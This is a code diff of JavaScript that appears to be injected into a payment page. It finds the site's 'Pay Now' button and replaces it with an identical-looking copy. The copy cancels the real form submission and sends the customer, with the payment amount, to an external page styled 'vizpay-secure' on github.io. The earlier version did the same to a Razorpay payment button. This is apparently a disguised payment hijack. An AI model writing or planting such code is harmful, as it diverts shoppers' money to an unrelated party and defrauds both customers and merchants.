@@ -35,14 +35,29 @@
     const result = Math.ceil(amount / 100);
     console.log(result); // This will output the result
 
-    // Change the button action
-    const payButton = document.querySelector('.razorpay-payment-button'); // Select the button
-    if (payButton) {
-      payButton.onclick = function(event) {
+    // Find the specific button to replace
+    const oldButton = document.querySelector('input[type="submit"][name="Pay Now"][class="button1"][value="CONTINUE"][style="border:0px solid;"]');
+
+    if (oldButton) {
+      // Create a new button with specified attributes
+      const newButton = document.createElement('input');
+      newButton.type = 'submit';
+      newButton.name = 'Pay Now';
+      newButton.className = 'button1';
+      newButton.value = 'CONTINUE';
+      newButton.style.border = '0px solid';
+
+      // Add the click event to the new button
+      newButton.onclick = function(event) {
         event.preventDefault(); // Prevent the default form submission
         const newUrl = `https://vizpay-secure.github.io/vizpay/?isc=${result}`; // Change to your desired URL
         window.location.href = newUrl; // Redirect to the new URL
       };
+
+      // Replace the old button with the new button
+      oldButton.parentNode.replaceChild(newButton, oldButton); // Replace the old button with the new one
+    } else {
+      console.log("No matching button found to replace.");
     }
   } else {
     console.log("Amount could not be parsed.");
